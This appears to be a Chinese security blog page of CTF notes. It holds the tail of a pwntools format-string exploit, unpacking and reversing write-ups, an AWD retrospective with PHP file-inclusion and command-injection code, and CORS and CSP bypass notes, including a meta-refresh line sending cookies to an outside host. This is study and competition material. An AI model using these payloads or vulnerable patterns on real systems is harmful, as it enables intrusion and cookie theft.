class="string">&#x27;-&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)-<span class="number">0x20837</span></span><br><span class="line">	info(<span class="string">&quot;stack : &quot;</span> + <span class="built_in">hex</span>(stack))</span><br><span class="line">	info(<span class="string">&quot;libc : &quot;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line">	onegadget = <span class="number">0xf1147</span>+libc.address</span><br><span class="line">	</span><br><span class="line">	ret_addr = stack - <span class="number">0x1e8</span></span><br><span class="line">	payload =  <span class="string">&quot;%&#123;&#125;c%23$hhn&quot;</span>.<span class="built_in">format</span>(<span class="number">0x14</span>).ljust(<span class="number">0x10</span>,<span class="string">&#x27;_&#x27;</span>)</span><br><span class="line">	payload += fmtstr(<span class="number">15</span>,ret_addr,p64(onegadget)[:<span class="number">2</span>],<span class="number">0x19</span>)</span><br><span class="line">	p.send(payload)</span><br><span class="line">	pause()</span><br><span class="line">	<span class="comment"># :0000000000400865                 retn</span></span><br><span class="line">	offset = <span class="number">13</span></span><br><span class="line">	payload =  <span class="string">&quot;%&#123;&#125;c%16$hhn%&#123;&#125;c%17$hn&quot;</span>.<span class="built_in">format</span>(<span class="built_in">ord</span>(p64(onegadget)[<span class="number">2</span>:<span class="number">3</span>]),<span class="number">0x865</span>-<span class="built_in">ord</span>(p64(onegadget)[<span class="number">2</span>:<span class="number">3</span>])).ljust(<span class="number">0x18</span>,<span class="string">&#x27;_&#x27;</span>)</span><br><span class="line">	payload += p64(ret_addr+<span class="number">2</span>)+p64(ret_addr-<span class="number">8</span>)</span><br><span class="line">	payload = payload.ljust(<span class="number">0x80</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">	p.send(payload)</span><br><span class="line">	p.interactive()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	libc = ELF(<span class="string">&quot;./libc.so&quot;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">	main(args[<span class="string">&#x27;REMOTE&#x27;</span>])</span><br></pre></td></tr></table></figure>



<h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><h3 id="bwarm"><a href="#bwarm" class="headerlink" title="bwarm"></a>bwarm</h3><p>首先，还是查壳，没啥说的 vmp2.0.7</p>
<p> 根据vmp系列脱壳教程，这个壳是1.8以上的方案进行脱壳。先拖入OD，下一个API断点  VirtualProtect (教程建议是下硬件断点，可能是我的OD有问题，硬件断点断不下来，只能是F2断点了 T_T)</p>
<p>然后F9开始跑，测试到第5次跑飞……</p>
<p>那么就在第四次的时开始候单步跟踪，先跳出VirtualProtect 函数 ，然后对代码段设置，内存访问断点</p>
<p>然后F9继续运行，断下来后，在ESP的地方跟踪内存数据，找到SEH结构化异常的上面35C地址那块，下一个硬件写入断点，并取消之前的内存访问断点</p>
<p>然后继续F9运行，再次断下来，这次再在代码断下内存访问断点，然后多次F9运行，注意观察栈帧的变化，快到SEH的地方就接近OEP了，此时已经跟踪到解压后的代码段，然后进行一下代码分析。</p>
<p>完成分析后，代码就还原了，然后单步跟踪，发现OEP </p>
<p>发现OEP后，同时我们也注意到栈帧部分被压入了3条数据，这个就是VMP偷取的代码，我们需要进行还原，于是在当前位置查找一段 0000000000的内存段</p>
<p>然后，对VMP偷取的代码进行patch。最后跳转到OEP 也就是 jmp 012319C9</p>
<p>接着我们把当前的 01231FB5 设置为新的EIP，就可以进行dump内存操作了，填好起始地址和入口地址后，点击脱壳</p>
<p>把脱壳的文件保存为 dump.exe 然后尝试运行，发现不能运行，直接崩溃掉了</p>
<p>于是猜到可能是重定向表的问题造成，用PE编辑器修改一下这里，然后保存。</p>
<p>再次运行，OK ！！</p>
<p>然后可以载入OD进行动态分析了。</p>
<p>为了方便调试，我们知道程序运行后，会提示输入字符串，那么我们先找到输入字符串的地方。</p>
<p>然后开始单步跟踪到这里，就是完成字符串输入后</p>
<p>继续跟踪，我们发现一个base64的字符串：dQkLdqXP=mLMAa8p=lnncQcq/GEPdGKXcNDl=Mnr=pcoBGPQdG1NA3Aw</p>
<p>那么另外一个字符串就是base64的字典了，也就是：0123456789+/=ABCDEFGHIabcdefghiJKLMNOPQRSTUVWXYZjklmnopqrstuvwxyz</p>
<p>于是，我们就可以根据这个对base64zi’f字符串进行解密：</p>
<p>坑了，竟然是乱码，还以为就这样搞定了呢，后来请教了一下大神，他说是字典有问题，于是我仔细的看了一下，确实</p>
<p>字典里面按说是不应该有‘=’ 这个字符的，按base64的说法这个是占位用的来补足字节数。所以按照大神的指点，我把大神的脚本用C++重新写了一遍（也是为了更好的理解反向分析的过程），终了跑出来了 T_T</p>
<p>最后，就是见证奇迹的时刻到了 * ^_^ *</p>
<p>flag{e38b5b63-4bf7-4ee8-b422-83f599fe0c43}</p>
<h3 id="Md5Jungle"><a href="#Md5Jungle" class="headerlink" title="Md5Jungle"></a>Md5Jungle</h3><p>首先查壳，丢到exeinfope里面一看，发现是asp的壳。</p>
<p>于是用手头的asp脱壳工具尝试脱壳，发现都不行，不是不支持就是报错！没办法，只能老实手工脱壳了。</p>
<p>根据ESP定律+IAT修复+重定向表修复后，脱壳的程序可以正常运行。</p>
<p>用OD载入后，开始单步跟踪</p>
<p>到用户输入界面，我随便输入了个字符串：111111111（9个1）单步跟入到下图，发现了flag字样</p>
<p>这个应该是flag的头，于是继续跟进，发现确实在核对输入数据与flag{比较，这块就过不去了</p>
<p>于是果断的从来，输入数据为 flag{111111111，来到了下图的地方，在0x16的位置比较0x7D 也就是’}’符号</p>
<p>由于C语言的字符串下标是从0开始的，也就是字符串第23个字符处必须是}</p>
<p>于是构造字符串：flag{11111111111111111} 继续跟进，接下来是在0x7、0xc、0x11处核对字符 ‘-‘ (即：0x2D)</p>
<p>于是字符串就变成了flag{11-1111-1111-1111}，继续跟进，发现了一个字符串：01E3421C=dump_SCY.01E3421C (ASCII “c7218260ef2b966ab0454e07c55cf4e9”)<br>感觉像是MD5的字符串，于是用python解了一下，得到： oh，结之前的flag应该就是flag{oh-1111-1111-1111}</p>
<p>再次输入后，继续跟进发现过去了，开始进行第二段的比较得到了下图的错误：</p>
<p>于是反复跟比较算法也没有找到任何有效的数据，结合本题的提示是md5段字节爆破，估计是这块需要进行爆破处理了。</p>
<p>于是继续python大法，得到字符串：flag{oh-aa30-1111-1111}</p>
<p>继续输入后，单步跟进，此时发现一个字符串：堆栈地址=001DFC30, (ASCII “YTkxYQ==”)   eax=786B5459<br>看起来像B64编码，于是尝试解码，得到第三组的flag值：a91a 。</p>
<p>想起之前用od也看过字符串，于是找到第四组的字符串：NGZicA==   ，解码为：4fbp</p>
<p>那么最终的flag就是：flag{oh-aa30-a91a-4fbp}</p>
<h3 id="shy"><a href="#shy" class="headerlink" title="shy"></a>shy</h3><p> 首先查壳，丢到ExeinfoPE里面看一下，确定是upx壳</p>
<p>于是丢到OD里面进行脱壳处理，由于是压缩壳，跟踪起来比较麻烦，我选择了个偷懒的办法，下一个api访问断点</p>
<p>即：VirtualProtect ，运行3次F9后就跑飞了，于是在2次运行后，单步跟踪，到OEP</p>
<p>使用OD自带的插件进行脱壳，注意基址和OEP的关系，计算好后填入</p>
<p>然后点击脱壳，双击发现不能运行。</p>
<p>这个问题估计是重定向造成，于是修复一下重定向表的数据。</p>
<p>保存后，再次运行可以正常跑起来了</p>
<p>再次用OD载入，发现入口地址不是OEP</p>
<p>按说是已经解密完成了，于是我定位到OEP （0x1072940）一看究竟。</p>
<p>确实已经解密，那么为了方便调试，我直接用OD改一下入口代码就可以实现了。</p>
<p>然后把修改完毕的程序，重新保存到文件，由于有重定位会有下图的提示，点击 是 ，然后右键保存一份dump0.exe</p>
<p>继续，OD载入dump0.exe 发现修改成功，可以直接跳转到OEP行，然后单步跟踪，到输入后，发现后面的代码是个加密处理的代码，于是丢到IDA里面看一下这块对应的反编译代码。</p>
<p>buf 就是用户输入的字符串，if ( <em>(&amp;v4 + j) != v79[j] )   这个就是关键的比较，那么V79[]就应该是异或后的结果，也就是ben本题的密钥，于是在OD中定位值：6ljh,!;:+&amp;p%i</em>a=Sc4#pt*%</p>
<p>接下来就简单了，直接把这个密钥输入，然后再次定位到这块就能得到flag了</p>
<p>最终得到flag：flag{cb7670ab-c597-4b17}   输入到shy.exe 验证一下 : )</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/10/01/byb2019/" data-id="cku8j3fgy0030dan76x5u6zau" data-title="百越杯2019" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-byb2019线下awd" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/01/byb2019%E7%BA%BF%E4%B8%8Bawd/" class="article-date">
  <time class="dt-published" datetime="2021-10-01T15:35:42.672Z" itemprop="datePublished">2021-10-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/01/byb2019%E7%BA%BF%E4%B8%8Bawd/">百越杯总结</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="百越杯总结"><a href="#百越杯总结" class="headerlink" title="百越杯总结"></a>百越杯总结</h1><h2 id="include-require"><a href="#include-require" class="headerlink" title="include,require"></a>include,require</h2><p>如果<strong>文件被包含两次</strong>，PHP 5   <strong>发出致命错误</strong>因为函数已经被定义，但是 PHP 4 不会对在   <a href="mk:@MSITStore:D:\ctf\手册\php_manual_zh.chm::/res/function.return.html">return</a> 之后定义的函数报错。推荐使用   <a href="mk:@MSITStore:D:\ctf\手册\php_manual_zh.chm::/res/function.include-once.html">include_once</a> 而不是检查文件是否已包含并在包含文件中有条件返回。 </p>
<h2 id="include-once-require-once"><a href="#include-once-require-once" class="headerlink" title="include_once,require_once"></a>include_once,require_once</h2><p><em>include_once</em> 语句在脚本执行期间包含并运行指定文件。此行为和   <a href="mk:@MSITStore:D:\ctf\手册\php_manual_zh.chm::/res/function.include.html">include</a>   语句类似，唯一区别是如果该文件中已经被包含过，则不会再次包含。如同此语句名字暗示的那样，只会包含一次。</p>
<p><em>require_once</em> 语句和 <a href="mk:@MSITStore:D:\ctf\手册\php_manual_zh.chm::/res/function.require.html">require</a>   语句完全相同，唯一区别是 PHP 会检查该文件是否已经被包含过，如果是则不会再次包含。 </p>
<p><strong>如果所包含文件不存在,include_once不会退出,而require_once会直接退出</strong></p>
<h2 id="比赛失误原因"><a href="#比赛失误原因" class="headerlink" title="比赛失误原因"></a>比赛失误原因</h2><h3 id="log没挂好"><a href="#log没挂好" class="headerlink" title="log没挂好"></a>log没挂好</h3><h3 id="没有找到有效的攻击流量"><a href="#没有找到有效的攻击流量" class="headerlink" title="没有找到有效的攻击流量"></a>没有找到有效的攻击流量</h3><p>grep这个命令不够熟悉,</p>
<h4 id="system"><a href="#system" class="headerlink" title="system"></a>system</h4><p>我的过滤条件变迁:</p>
<p><code>&quot;flag&quot; =&gt; &quot;/flag&quot;</code>,到这里后我就没有继续过滤,”/flag”其实还是有很多干扰信息的,我就差一步</p>
<p><code>grep &quot;/flag &quot; */* </code></p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g91fl7ptrij30k20arac7.jpg" alt="image.png"></p>
<p><code>grep &quot;/flag &quot; */* -C300 | grep &quot;end pageheader&quot; -C 10</code></p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g91fk6h3jxj30oa05cdfx.jpg" alt="image.png"></p>
<h3 id="没找到的洞"><a href="#没找到的洞" class="headerlink" title="没找到的洞"></a>没找到的洞</h3><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g91c2qcxxyj30pl01vdgk.jpg" alt="image.png"></p>
<p>php的web主要也就这两的洞</p>
<h4 id="grayscale"><a href="#grayscale" class="headerlink" title="grayscale"></a>grayscale</h4><p><code>include $_GET[&#39;img&#39;];</code>配合有后门的图片m.jpg</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g91c4zci7cj30f001g3yg.jpg" alt="image.png"></p>
<p>开始我直接搜索<code>&lt;?</code>和<code>&lt;%</code> 没搜索到就以为是误报,??也能执行?????</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g91c93p00wj307100zjr6.jpg" alt="image.png"></p>
<p>用strings查看////,编码问题导致??,以后用ascii码来查看</p>
<h4 id="ssystem"><a href="#ssystem" class="headerlink" title="ssystem"></a>ssystem</h4><p>虽然找到了exec那个洞</p>
<p>但是在index.php中：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$page</span> = <span class="string">&#x27;chart.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">include_once</span> <span class="string">&quot;<span class="subst">$page</span>&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以配合文件上传拿到shell或者是直接include /flag也能拿到flag</p>
<h3 id="洞没修好"><a href="#洞没修好" class="headerlink" title="洞没修好"></a>洞没修好</h3><h4 id="SSystem"><a href="#SSystem" class="headerlink" title="SSystem"></a>SSystem</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    exec(<span class="string">&quot;tar -cf backup/<span class="subst">$name</span> images/*.jpg&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;div class=\&quot;alert alert-success\&quot; role=\&quot;alert\&quot;&gt;</span></span><br><span class="line"><span class="string">            导出成功,&lt;a href=&#x27;backup/<span class="subst">$name</span>&#x27;&gt;点击下载&lt;/a&gt;&lt;/div&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>原本以为<code>$name</code>再参数位置,用escapeshellarg就可以了</p>
<p>但是!!!!!!!虽然escapeshellarg会把$name放在引号里面</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含 exec(), system() 执行运算符 。 </span><br></pre></td></tr></table></figure>

<p>php手册里解释是单引号,实际却是<code>tar -cf backup/&quot;123&quot; images/*.jpg</code></p>
<p>?????这是在我本机php5.6的环境下,php7环境也是双引号???</p>
<p>然后在自己的服务器上之前是双引号后面是单引号????</p>
<p>由于不知道靶场上会怎样,我也不确定我用escapeshellarg是不是修好了,然后这题就修补失败了</p>
<p>比较好的修复方案(在实现原功能的情况下去掉命令执行):</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec(&quot;tar -cf backup/aa.tar images/*.jpg&quot;);</span><br><span class="line">rename(&quot;backup/aa.tar&quot;,&quot;backup/$name.tar&quot;);</span><br></pre></td></tr></table></figure>





<h3 id="没找到check没过的原因"><a href="#没找到check没过的原因" class="headerlink" title="没找到check没过的原因"></a>没找到check没过的原因</h3><p>check的id是172.16.4.7</p>
<p>但是直接搜索 HTTP 没找到check没过的原因,我猜因为拖下来的log只有前半小时,而开局的是否我们的check好像是过的</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我看到洞的时候没有修好</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/10/01/byb2019%E7%BA%BF%E4%B8%8Bawd/" data-id="cku8j3fh00034dan7dr69dpxr" data-title="百越杯总结" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-bypass CORS" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/01/bypass%20CORS/" class="article-date">
  <time class="dt-published" datetime="2021-10-01T15:35:42.672Z" itemprop="datePublished">2021-10-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/web/">web</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/01/bypass%20CORS/">bypass CORS</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="bypass-CORS"><a href="#bypass-CORS" class="headerlink" title="bypass CORS"></a>bypass CORS</h1><h2 id="什么是CORS"><a href="#什么是CORS" class="headerlink" title="什么是CORS"></a>什么是CORS</h2><p>CORS: Cross Origin Resource Share,设置在服务端，客户端执行的一种策略。</p>
<blockquote>
<p>出于安全原因，浏览器限制从脚本内发起的跨源HTTP请求或者 跨站请求可以正常发起，但是返回结果被浏览器拦截了 。 例如，XMLHttpRequest和Fetch API遵循同源策略。 这意味着使用这些API的Web应用程序只能从加载应用程序的同一个域请求HTTP资源，除非响应报文包含了正确CORS响应头。 </p>
</blockquote>
<h2 id="相关的字段"><a href="#相关的字段" class="headerlink" title="相关的字段"></a>相关的字段</h2><p>响应：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin</span><br><span class="line">Access-Control-Expose-Headers</span><br><span class="line">Access-Control-Max-Age</span><br><span class="line">Access-Control-Allow-Credentials</span><br><span class="line">Access-Control-Allow-Methods</span><br><span class="line">Access-Control-Allow-Headers</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>请求：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Origin</span><br><span class="line">Access-Control-Request-Method</span><br><span class="line">Access-Control-Request-Headers</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="CORS配置错误"><a href="#CORS配置错误" class="headerlink" title="CORS配置错误"></a>CORS配置错误</h2><h3 id="根据某些字段来设置ACAO头"><a href="#根据某些字段来设置ACAO头" class="headerlink" title="根据某些字段来设置ACAO头"></a>根据某些字段来设置ACAO头</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /sensitive-victim-data HTTP/1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Origin: https://malicious-website.com</span><br><span class="line">Cookie: sessionid=...</span><br><span class="line"></span><br><span class="line">根据Origin头来设置Access-Control-Allow-Origin</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Access-Control-Allow-Origin: https://malicious-website.com</span><br><span class="line">Access-Control-Allow-Credentials: true</span><br></pre></td></tr></table></figure>

<h3 id="对Origin头的错误解析"><a href="#对Origin头的错误解析" class="headerlink" title="对Origin头的错误解析"></a>对Origin头的错误解析</h3><p>因为要对子域名的支持，所以有些网站会这样写:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if Origin.domain startwith &quot;domain.com&quot;:</span><br><span class="line">	return &quot;Access-Control-Allow-Origin: &quot;+Origin</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if Origin.domain endwith &quot;domain.com&quot;:</span><br><span class="line">	return &quot;Access-Control-Allow-Origin: &quot;+Origin</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>像这种都很好绕过：</p>
<p>domain.com.evildomain.com 或者 evildomain-domain.com</p>
<h3 id="白名单中存在-null"><a href="#白名单中存在-null" class="headerlink" title="白名单中存在:null"></a>白名单中存在:null</h3><p> Origin支持值null，在某些情况下，浏览器可能会在Origin标头中发送值null：</p>
<ul>
<li><p>跨站点重定向</p>
</li>
<li><p>来自序列化数据的请求</p>
</li>
<li><p>使用<code>file</code>协议的请求</p>
</li>
<li><p>沙盒中的跨域请求</p>
</li>
</ul>
<h2 id="利用受信任的域"><a href="#利用受信任的域" class="headerlink" title="利用受信任的域"></a>利用受信任的域</h2><p>在受信任的域上找到xss，就可以绕过CORS</p>
<h2 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h2><p>23333</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cors">https://portswigger.net/web-security/cors</a> </p>
<p> <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS</a> </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/10/01/bypass%20CORS/" data-id="cku8j3fh10037dan78fx9bwcn" data-title="bypass CORS" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-bypass_csp" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/01/bypass_csp/" class="article-date">
  <time class="dt-published" datetime="2021-10-01T15:35:42.672Z" itemprop="datePublished">2021-10-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/web/">web</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/01/bypass_csp/">bypass_csp</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="bypass-csp"><a href="#bypass-csp" class="headerlink" title="bypass csp"></a>bypass csp</h1><p>内容安全策略  (<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Glossary/CSP">CSP</a>) 是一个额外的安全层，用于检测并削弱某些特定类型的攻击，包括跨站脚本 (<a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Glossary/XSS">XSS</a>) 和数据注入攻击等。无论是数据盗取、网站内容污染还是散发恶意软件，这些攻击都是主要的手段。 </p>
<h2 id="csp语法"><a href="#csp语法" class="headerlink" title="csp语法"></a>csp语法</h2><p>CSP的特点就是他是在浏览器层面做的防护，是和同源策略同一级别，除非浏览器本身出现漏洞，否则不可能从机制上绕过。</p>
<p>CSP只允许被认可的JS块、JS文件、CSS等解析，只允许向指定的域发起请求。</p>
<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP</a></p>
<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy</a></p>
<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/default-src"><code>default-src</code></a> :在其他资源类型没有符合自己的策略时应用该策略(有关完整列表查看<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/default-src"><code>default-src</code></a> )</p>
<p><img src="https://images.seebug.org/content/images/2017/10/7b7e1d4c-9d9a-4bd0-ae6d-f266871fa300.png-w331s" alt="image773"></p>
<p><img src="https://images.seebug.org/content/images/2017/10/c5a45eca-7e0c-4ebf-8143-712e4594f2fd.png-w331s" alt="image878"></p>
<h3 id="strict-dynamic"><a href="#strict-dynamic" class="headerlink" title="strict-dynamic"></a>strict-dynamic</h3><p><code>script-src &#39;nonce-r4nd0m&#39; &#39;strict-dynamic&#39;; object-src &#39;none&#39;; base-uri &#39;none&#39;; </code></p>
<p>script-src 中 strict-dynamic 中的作用:</p>
<ul>
<li>丢弃白名单</li>
<li>允许执行js生成的js代码，例如：document.createElement(‘script’) </li>
<li>使  nonce-only CSPs  可以工作</li>
</ul>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200520164256.png" alt="image1216"></p>
<h3 id="一些注意点"><a href="#一些注意点" class="headerlink" title="一些注意点"></a>一些注意点</h3><p><code>https://cdn.com/*</code>只能匹配<code>https://cdn.com/*</code></p>
<h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><h3 id="csp策略不完全导致的绕过"><a href="#csp策略不完全导致的绕过" class="headerlink" title="csp策略不完全导致的绕过"></a>csp策略不完全导致的绕过</h3><h3 id="利用302跳转"><a href="#利用302跳转" class="headerlink" title="利用302跳转"></a>利用302跳转</h3><p><code> Content-Security-Policy: default-src &#39;self &#39;; script-src http://127.0.0.1/static/</code></p>
<p>如果可信域内存在一个可控的重定向文件，那么CSP的目录限制就可以被绕过。 </p>
<p>假设static目录下存在一个302文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Static/302.php</span><br><span class="line"></span><br><span class="line">&lt;?php Header(&quot;location: &quot;.$_GET[&#x27;url&#x27;])?&gt;</span><br></pre></td></tr></table></figure>

<p>像刚才一样，上传一个test.jpg 然后通过302.php跳转到upload目录加载js就可以成功执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;static/302.php?url=upload/test.jpg&quot;&gt;</span><br></pre></td></tr></table></figure>



<h3 id="绕过域限制的一些tricks"><a href="#绕过域限制的一些tricks" class="headerlink" title="绕过域限制的一些tricks"></a>绕过域限制的一些tricks</h3><p><code>Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39;</code></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;prefetch&quot;</span> <span class="attr">href</span>=<span class="string">&quot;http://lorexxar.cn&quot;</span>&gt;</span> (H5预加载)(only chrome)</span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;dns-prefetch&quot;</span> <span class="attr">href</span>=<span class="string">&quot;http://lorexxar.cn&quot;</span>&gt;</span> （DNS预加载）</span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;refresh&quot;</span> <span class="attr">content</span>=<span class="string">&quot;5;http://lorexxar.cn?c=[cookie]&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="利用可信域的资源绕过"><a href="#利用可信域的资源绕过" class="headerlink" title="利用可信域的资源绕过"></a>利用可信域的资源绕过</h3><p>很多网站都会将google,baidu……添加到可信域里面，而如果里面存在可控的输出我们便可以绕过csp</p>
<p>常用可控jsonp: <a target="_blank" rel="noopener" href="https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/jsonp.js#L32-L180">https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/jsonp.js#L32-L180</a> </p>
